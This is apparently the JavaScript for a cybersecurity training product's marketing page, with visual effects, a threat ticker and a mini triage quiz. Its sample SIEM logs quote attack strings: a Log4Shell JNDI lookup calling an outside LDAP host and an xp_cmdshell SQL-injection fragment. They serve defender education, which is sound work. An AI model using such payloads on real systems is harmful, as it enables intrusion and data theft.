// ==========================================================================
// LIVERANGE // AWWWARDS & 21ST.DEV INTERACTIVE ENGINE
// Features: 3D Holographic Cyber Radar Globe, Split-Flap Ticker, Bento Spotlight, 
//           Scroll Motion Observer, 3D Perspective Tilt, Mini-Lab & Audio
// ==========================================================================

const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

// --- Tactical Audio Synthesizer ---
let soundEnabled = localStorage.getItem('lr-sound') === 'true';
let audioCtx = null;

function playTone(freq, type = 'sine', duration = 0.05, vol = 0.03) {
  if (!soundEnabled) return;
  try {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.type = type;
    osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
    gain.gain.setValueAtTime(vol, audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + duration);
  } catch (e) {}
}

const audio = {
  click: () => playTone(1200, 'sine', 0.03, 0.03),
  blip: () => playTone(820, 'triangle', 0.04, 0.02),
  flap: () => playTone(360 + Math.random() * 80, 'square', 0.02, 0.015),
  alert: () => playTone(300, 'sawtooth', 0.12, 0.04),
  lock: () => {
    playTone(700, 'sine', 0.04, 0.03);
    setTimeout(() => playTone(1100, 'sine', 0.08, 0.03), 50);
  },
  success: () => {
    playTone(980, 'sine', 0.06, 0.04);
    setTimeout(() => playTone(1480, 'sine', 0.1, 0.03), 60);
  }
};

function toggleAudio() {
  soundEnabled = !soundEnabled;
  localStorage.setItem('lr-sound', soundEnabled);
  const btn = $('#btn-toggle-sound');
  if (btn) btn.textContent = soundEnabled ? 'Audio: On' : 'Audio: Off';
  if (soundEnabled) audio.success();
}

// ==========================================================================
// 1. VOLUMETRIC SILVER RAYS BACKGROUND CANVAS (60 FPS)
// ==========================================================================
function initRaysCanvas() {
  const canvas = document.getElementById('rays-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let width = 0, height = 0, dpr = 1;
  let mouseX = 0, targetMouseX = 0;

  function resize() {
    dpr = Math.min(window.devicePixelRatio || 1, 2);
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width * dpr;
    canvas.height = height * dpr;
    ctx.scale(dpr, dpr);
  }
  window.addEventListener('resize', resize);
  resize();

  window.addEventListener('mousemove', e => {
    targetMouseX = (e.clientX / (width || 1) - 0.5) * 60;
  });

  const rayCount = 16;
  const rays = [];
  const rayAngle = -38 * (Math.PI / 180);

  for (let i = 0; i < rayCount; i++) {
    const isSharp = i % 3 === 0;
    rays.push({
      x: (i / rayCount) * (width * 2.4) - width * 0.7,
      width: isSharp ? 55 + Math.random() * 60 : 140 + Math.random() * 220,
      speed: 0.18 + Math.random() * 0.26,
      alpha: isSharp ? 0.30 + Math.random() * 0.18 : 0.16 + Math.random() * 0.16,
      phase: Math.random() * Math.PI * 2,
      freq: 0.007 + Math.random() * 0.012,
      r: Math.floor(225 + Math.random() * 25),
      g: Math.floor(235 + Math.random() * 20),
      b: Math.floor(250 + Math.random() * 5)
    });
  }

  let time = 0;
  function render() {
    time += 1;
    mouseX += (targetMouseX - mouseX) * 0.04;

    ctx.clearRect(0, 0, width, height);
    ctx.fillStyle = '#050608';
    ctx.fillRect(0, 0, width, height);

    // Bottom Bright Metallic Horizon Pool
    const floorGlow = ctx.createRadialGradient(
      width * 0.5 + mouseX * 0.25, height * 0.98, 20,
      width * 0.5 + mouseX * 0.25, height * 0.98, height * 0.75
    );
    floorGlow.addColorStop(0, 'rgba(235, 245, 255, 0.40)');
    floorGlow.addColorStop(0.2, 'rgba(200, 225, 255, 0.28)');
    floorGlow.addColorStop(0.45, 'rgba(150, 180, 220, 0.14)');
    floorGlow.addColorStop(0.75, 'rgba(90, 115, 155, 0.05)');
    floorGlow.addColorStop(1, 'rgba(5, 6, 8, 0)');
    ctx.fillStyle = floorGlow;
    ctx.fillRect(0, 0, width, height);

    // Drifting Volumetric Angled Rays
    ctx.save();
    ctx.globalCompositeOperation = 'screen';
    ctx.translate(width * 0.5 + mouseX, height * 0.5);
    ctx.rotate(rayAngle);

    const diag = Math.sqrt(width * width + height * height) * 1.4;

    rays.forEach(ray => {
      ray.x += ray.speed;
      if (ray.x > diag) ray.x = -diag;

      const dynamicAlpha = ray.alpha * (1 + 0.32 * Math.sin(time * ray.freq + ray.phase));
      const grad = ctx.createLinearGradient(ray.x - ray.width / 2, 0, ray.x + ray.width / 2, 0);
      grad.addColorStop(0, `rgba(${ray.r}, ${ray.g}, ${ray.b}, 0)`);
      grad.addColorStop(0.22, `rgba(${ray.r}, ${ray.g}, ${ray.b}, ${dynamicAlpha * 0.48})`);
      grad.addColorStop(0.5, `rgba(255, 255, 255, ${Math.min(dynamicAlpha * 1.15, 1)})`);
      grad.addColorStop(0.78, `rgba(${ray.r}, ${ray.g}, ${ray.b}, ${dynamicAlpha * 0.48})`);
      grad.addColorStop(1, `rgba(${ray.r}, ${ray.g}, ${ray.b}, 0)`);

      ctx.fillStyle = grad;
      ctx.fillRect(ray.x - ray.width / 2, -diag, ray.width, diag * 2);
    });

    ctx.restore();
    requestAnimationFrame(render);
  }
  requestAnimationFrame(render);
}

// ==========================================================================
// 2. HERO LIQUID GLASS SOC INCIDENT COMMAND CONSOLE
// Interactive Threat Vector Triage, Dynamic SIEM Streams & Telemetry Gauges
// ==========================================================================
const HERO_THREATS = {
  log4shell: {
    id: 'CVE-2021-44228',
    name: 'Apache Log4j JNDI Remote Code Execution',
    chips: ['T1190 Exploit Public-Facing', 'Zero-Day Wild', 'Remote Code Exec', 'CVSS 10.0'],
    desc: 'Insecure JNDI lookup parsing allows unauthenticated remote attackers to execute arbitrary Java bytecode via nested ${jndi:ldap://} payloads in HTTP header telemetry.',
    logs: [
      { time: '14:02:11.204', tag: '[WAF-01]', type: 'norm', text: 'INBOUND URI /login User-Agent:${jndi:ldap://45.142.214.8/a}' },
      { time: '14:02:11.218', tag: '[RULE-CRIT]', type: 'crit', text: 'SIG-LOG4J-01 Matched outbound TCP/389 connect attempt' },
      { time: '14:02:11.450', tag: '[EDR-03]', type: 'warn', text: 'Spawning /bin/sh child from java.exe (PID: 4182)' },
      { time: '14:02:11.890', tag: '[SURICATA]', type: 'crit', text: 'Suspicious ELF payload download detected (mimikatz.x86)' },
      { time: '14:02:12.110', tag: '[CORRELATOR]', type: 'tag', text: 'Auto-Incident #LVR-44228 opened · High Confidence' }
    ],
    mttd: '04.2m',
    accuracy: '94%',
    coverage: '84%'
  },
  moveit: {
    id: 'CVE-2023-34362',
    name: 'Progress MOVEit Transfer SQLi Exfiltration',
    chips: ['T1190 Exploit Public-Facing', 'Cl0p Ransomware', 'Data Exfiltration', 'CVSS 9.8'],
    desc: 'SQL injection vulnerability in the MOVEit Transfer web application allowing unauthenticated attackers to bypass authentication, gain database access, and exfiltrate mass customer records.',
    logs: [
      { time: '08:44:02.115', tag: '[WAF-02]', type: 'norm', text: 'POST /guestaccess.aspx - HTTP 200 (payload 4.8KB)' },
      { time: '08:44:02.340', tag: '[DB-AUDIT]', type: 'crit', text: "SQLi Pattern: \"'; EXEC master..xp_cmdshell 'certutil' --\"" },
      { time: '08:44:03.012', tag: '[EDR-01]', type: 'warn', text: 'human2.aspx dropped into wwwroot/moveitdmz/ (Cl0p WebShell)' },
      { time: '08:44:03.882', tag: '[NET-FLOW]', type: 'crit', text: 'High-volume outbound transfer to 194.165.16.0/24 (3.2 GB)' },
      { time: '08:44:04.105', tag: '[CORRELATOR]', type: 'tag', text: 'Auto-Incident #LVR-34362: MOVEit Exfiltration Triage' }
    ],
    mttd: '03.8m',
    accuracy: '98%',
    coverage: '91%'
  },
  proxylogon: {
    id: 'CVE-2021-26855',
    name: 'Microsoft Exchange Pre-Auth SSRF to RCE',
    chips: ['T1505.003 Web Shell', 'HAFNIUM APT', 'SSRF to RCE', 'CVSS 9.8'],
    desc: 'Server-Side Request Forgery (SSRF) vulnerability in Exchange Server allowing unauthenticated attackers to authenticate as the Exchange server and execute arbitrary commands across on-prem mailboxes.',
    logs: [
      { time: '22:15:33.411', tag: '[IIS-LOG]', type: 'norm', text: 'POST /ecp/y.js Cookie: X-BEResource=localhost/autodiscover/...' },
      { time: '22:15:33.620', tag: '[WAF-01]', type: 'warn', text: 'SSRF bypass detected: Target internal Exchange backend service' },
      { time: '22:15:34.050', tag: '[EDR-02]', type: 'crit', text: 'UMWorkerProcess.exe spawned cmd.exe -> created test.aspx' },
      { time: '22:15:34.400', tag: '[DEFENDER]', type: 'crit', text: 'High-Severity: China Chopper web shell signature matched' },
      { time: '22:15:34.912', tag: '[CORRELATOR]', type: 'tag', text: 'Auto-Incident #LVR-26855: ProxyLogon Exchange breach' }
    ],
    mttd: '05.1m',
    accuracy: '91%',
    coverage: '88%'
  }
};

let currentThreatKey = 'log4shell';

function selectHeroThreat(threatKey) {
  const data = HERO_THREATS[threatKey];
  if (!data) return;
  currentThreatKey = threatKey;
  audio.click();

  // Update Tab States
  const tabs = $$('[data-threat-tab]');
  tabs.forEach(tab => {
    if (tab.getAttribute('data-threat-tab') === threatKey) {
      tab.classList.add('active');
    } else {
      tab.classList.remove('active');
    }
  });

  // Update Title & Chips
  const titleEl = $('#hero-threat-name');
  const chipsEl = $('#hero-threat-chips');
  const descEl = $('#hero-threat-desc');
  if (titleEl) titleEl.textContent = data.name;
  if (chipsEl) {
    chipsEl.innerHTML = data.chips.map(c => `<span class="chip-mono">${c}</span>`).join('');
  }
  if (descEl) descEl.textContent = data.desc;

  // Update SIEM Log Stream
  const logsEl = $('#hero-siem-logs');
  if (logsEl) {
    logsEl.innerHTML = data.logs.map(log => {
      let tagClass = 'log-tag';
      if (log.type === 'crit') tagClass = 'log-crit';
      if (log.type === 'warn') tagClass = 'log-warn';
      return `<div class="log-row"><span class="log-time">${log.time}</span> <span class="${tagClass}">${log.tag}</span> ${log.text}</div>`;
    }).join('');
  }

  // Update Metrics
  const mttdEl = $('#hero-stat-mttd');
  const accEl = $('#hero-stat-accuracy');
  const covEl = $('#hero-stat-coverage');
  const barEl = $('#hero-stat-bar');

  if (mttdEl) mttdEl.textContent = data.mttd;
  if (accEl) accEl.textContent = data.accuracy;
  if (covEl) covEl.textContent = data.coverage;
  if (barEl) barEl.style.width = data.coverage;
}

function initHeroCommandConsole() {
  const tabs = $$('[data-threat-tab]');
  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      const key = tab.getAttribute('data-threat-tab');
      selectHeroThreat(key);
    });
  });
}

// ==========================================================================
// 3. MECHANICAL SPLIT-FLAP INTEL TICKER (IMAGE 1 #13)
// ==========================================================================
const splitFlapMessages = [
  'CVE-2021-44228  LOG4SHELL     T1190 EXPLOIT   REVIEWED',
  'CVE-2023-34362  MOVEIT SQLI   CLOP RANSOM     REVIEWED',
  'CVE-2021-26855  PROXYLOGON    HAFNIUM SSRF    REVIEWED',
  'MTTD: 04.2 MIN  ACCURACY 94%  NMIMS SEC LAB   ACTIVE  ',
  'AIC-NMIMS PILOT INR 2999/SEAT MSSP BEACHHEAD  ACTIVE  '
];

let currentMessageIdx = 0;

function initSplitFlap() {
  const board = document.getElementById('split-flap-board');
  if (!board) return;

  const targetChars = 46;
  board.innerHTML = '';
  const tiles = [];

  for (let i = 0; i < targetChars; i++) {
    const tile = document.createElement('div');
    tile.className = 'split-flap-tile';
    tile.textContent = ' ';
    board.appendChild(tile);
    tiles.push(tile);
  }

  function flipToText(str) {
    const padded = (str + ' '.repeat(targetChars)).slice(0, targetChars);
    tiles.forEach((tile, idx) => {
      const nextChar = padded[idx] || ' ';
      if (tile.textContent !== nextChar) {
        setTimeout(() => {
          tile.classList.add('flip');
          tile.textContent = nextChar;
          audio.flap();
          setTimeout(() => tile.classList.remove('flip'), 280);
        }, idx * 16);
      }
    });
  }

  flipToText(splitFlapMessages[0]);

  setInterval(() => {
    currentMessageIdx = (currentMessageIdx + 1) % splitFlapMessages.length;
    flipToText(splitFlapMessages[currentMessageIdx]);
  }, 4400);
}

// ==========================================================================
// 4. 21ST.DEV MOUSE SPOTLIGHT BORDER EFFECT ON BENTO CARDS
// ==========================================================================
function initCardSpotlights() {
  const cards = $$('.spotlight-card');
  cards.forEach(card => {
    card.addEventListener('mousemove', e => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      card.style.setProperty('--mouse-x', `${x}px`);
      card.style.setProperty('--mouse-y', `${y}px`);
    });
  });
}

// ==========================================================================
// 5. SCROLL-TRIGGERED MOTION OBSERVER (AWWWARDS STAPLE)
// ==========================================================================
function initScrollObserver() {
  const elements = $$('.reveal-on-scroll');
  if (!elements.length) return;

  const observer = new IntersectionObserver((entries, obs) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('is-visible');
        obs.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.12,
    rootMargin: '0px 0px -40px 0px'
  });

  elements.forEach(el => observer.observe(el));
}

// ==========================================================================
// 6. 3D PERSPECTIVE TILT ON DASHBOARD SHOWCASE FRAME
// ==========================================================================
function initShowcaseTilt() {
  const container = $('.dashboard-showcase-container');
  const frame = $('.dashboard-showcase-glass');
  if (!container || !frame) return;

  container.addEventListener('mousemove', e => {
    const rect = container.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width - 0.5;
    const y = (e.clientY - rect.top) / rect.height - 0.5;
    const rotX = -y * 8;
    const rotY = x * 8;
    frame.style.transform = `perspective(1400px) rotateX(${rotX.toFixed(2)}deg) rotateY(${rotY.toFixed(2)}deg) scale(1)`;
  });

  container.addEventListener('mouseleave', () => {
    frame.style.transform = 'perspective(1400px) rotateX(4deg) rotateY(0deg) scale(0.98)';
  });
}

// ==========================================================================
// 7. INTERACTIVE 6-STAGE PIPELINE (FIG. 2)
// ==========================================================================
const pipelineData = [
  {
    stage: '01. DISCOVER',
    title: 'Public Threat Intelligence Feeds',
    input: 'NIST NVD 2.0 API, CISA KEV (Known Exploited Vulnerabilities), RSS Advisories',
    engine: 'Continuous crawler ingesting CVE disclosures, CVSS v3.1 metrics, and affected CPEs.',
    output: 'Normalized JSON vulnerability schema stored in telemetry staging database.'
  },
  {
    stage: '02. INTERPRET',
    title: 'Normalization & MITRE ATT&CK Mapping',
    input: 'Raw CVE description & CVSS vectors (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)',
    engine: 'Automated technique classifier maps vulnerability mechanics to ATT&CK Enterprise Matrix (e.g. T1190).',
    output: 'Enriched metadata pack with actor attribution (APT41, FIN7) and technology stack tagging.'
  },
  {
    stage: '03. PREPARE',
    title: 'Scenario Generation & Telemetry Compiler',
    input: 'ATT&CK technique, attack chain flow, and target technology stack (e.g. Log4j / Apache).',
    engine: 'Synthetic SIEM log generator creates realistic multi-host log correlation trails (WAF, EDR, DNS).',
    output: 'Structured 3-step investigation lab (Step 1 Investigate, Step 2 Classify, Step 3 Respond).'
  },
  {
    stage: '04. HUMAN REVIEW ★',
    title: 'Mandatory Human-Review Gate (Mentor Supervised)',
    input: 'Draft scenario package pending validation.',
    engine: 'Academic & security expert review by Prof. Pintu Shah ensures technical validity and eliminates hallucinations.',
    output: 'Cryptographically signed scenario pack approved for learner distribution.'
  },
  {
    stage: '05. INVESTIGATE',
    title: 'SOC Analyst Cyber Range Exercise',
    input: 'Approved scenario pack served to analyst workstation.',
    engine: 'In-browser interactive SIEM telemetry viewer with IOC filtering and guided decision decks.',
    output: 'Analyst triage submission with millisecond precision timestamp recording.'
  },
  {
    stage: '06. MEASURE',
    title: 'Deterministic Readiness & Forensic Scoring',
    input: 'Submitted incident decisions and telemetry audit trail.',
    engine: 'Deterministic evaluation against NIST SP 800-61r2 standards and MTTD calculation.',
    output: 'Readiness matrix score, session forensics, and downloadable proof dossier.'
  }
];

function initPipelineNodes() {
  const nodes = $$('.pipeline-mini-node');
  const inspector = $('#bento-inspector-console');
  if (!nodes.length || !inspector) return;

  nodes.forEach((node, idx) => {
    node.addEventListener('click', () => {
      audio.click();
      nodes.forEach(n => n.classList.remove('active'));
      node.classList.add('active');

      const d = pipelineData[idx];
      inspector.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;border-bottom:1px solid var(--silver-border);padding-bottom:6px">
          <strong style="color:#fff;font-size:12.5px">${d.stage} // ${d.title}</strong>
          <span style="font-size:10px;color:var(--silver-dark)">STAGE_0${idx + 1}</span>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:8px">
          <div>
            <div style="color:var(--silver-dark);font-size:9.5px">INPUT TELEMETRY:</div>
            <div style="color:var(--silver-mid)">${d.input}</div>
          </div>
          <div>
            <div style="color:var(--silver-dark);font-size:9.5px">AUTOMATED ENGINE:</div>
            <div style="color:var(--silver-mid)">${d.engine}</div>
          </div>
        </div>
        <div style="padding-top:6px;border-top:1px solid var(--silver-border)">
          <span style="color:var(--silver-dark);font-size:9.5px">STAGE OUTPUT:</span>
          <span style="color:#fff;font-weight:600">${d.output}</span>
        </div>
      `;
    });
  });
}

// ==========================================================================
// 8. PLAYABLE MINI-LAB TRIAGE CONSOLE (BENTO CARD 3)
// ==========================================================================
function initMiniLab() {
  const choices = $$('.lab-choice-btn');
  const feedback = $('#mini-lab-feedback');
  const submitBtn = $('#btn-submit-mini-lab');
  let selected = -1;

  choices.forEach((card, idx) => {
    card.addEventListener('click', () => {
      audio.click();
      choices.forEach(c => c.classList.remove('active'));
      card.classList.add('active');
      selected = idx;
    });
  });

  if (submitBtn) {
    submitBtn.addEventListener('click', () => {
      if (selected === -1) {
        alert('Please select a triage action first.');
        return;
      }
      if (selected === 0) {
        audio.success();
        feedback.innerHTML = `
          <div style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.3);border-radius:6px;padding:12px;color:#fff">
            <strong>✓ Correct Analysis (Accuracy 100%):</strong>
            Host web-app-03 executed JNDI lookup string with immediate egress to remote LDAP server (198.51.100.42:389). Scheduled for network quarantine.
          </div>
        `;
      } else {
        audio.alert();
        feedback.innerHTML = `
          <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.15);border-radius:6px;padding:12px;color:var(--silver-mid)">
            <strong>✕ Incomplete Triage:</strong>
            Notice line 2 of the SIEM logs. web-app-03 initiated outbound connection to port 389 immediately after the \${jndi:ldap...} User-Agent pattern match.
          </div>
        `;
      }
    });
  }
}

// ==========================================================================
// 9. SIMULATE BREACH MICRO-GLITCH & THREAT SWITCHER
// ==========================================================================
function initThreatPills() {
  const pills = $$('[data-threat-focus]');
  pills.forEach(pill => {
    pill.addEventListener('click', () => {
      pills.forEach(p => p.classList.remove('active'));
      pill.classList.add('active');
      const id = pill.getAttribute('data-threat-focus');
      if (id === 'CVE-2021-44228') selectHeroThreat('log4shell');
      else if (id === 'CVE-2023-34362') selectHeroThreat('moveit');
      else if (id === 'CVE-2021-26855') selectHeroThreat('proxylogon');
    });
  });

  const btn = $('#btn-simulate-glitch');
  const target = $('#glitch-target-card');
  if (!btn) return;

  btn.addEventListener('click', () => {
    audio.alert();
    if (target) target.classList.add('glitching');
    const logsEl = $('#hero-siem-logs');
    if (logsEl) logsEl.classList.add('glitching');
    btn.textContent = 'Simulating Exploit Vector...';

    setTimeout(() => {
      if (target) target.classList.remove('glitching');
      if (logsEl) logsEl.classList.remove('glitching');
      const keys = ['moveit', 'proxylogon', 'log4shell'];
      const nextKey = keys[(keys.indexOf(currentThreatKey) + 1) % keys.length];
      selectHeroThreat(nextKey);
      btn.textContent = `Breach Ingested (${HERO_THREATS[nextKey].id})`;
      setTimeout(() => { btn.textContent = 'Simulate Emerging Breach'; }, 2400);
    }, 600);
  });
}

// ==========================================================================
// INITIAL BOOT
// ==========================================================================
function boot() {
  initRaysCanvas();
  initHeroCommandConsole();
  initSplitFlap();
  initCardSpotlights();
  initScrollObserver();
  initShowcaseTilt();
  initPipelineNodes();
  initMiniLab();
  initThreatPills();

  const soundBtn = $('#btn-toggle-sound');
  if (soundBtn) soundBtn.textContent = soundEnabled ? 'Audio: On' : 'Audio: Off';
}

if (document.readyState === 'loading') {
  window.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}
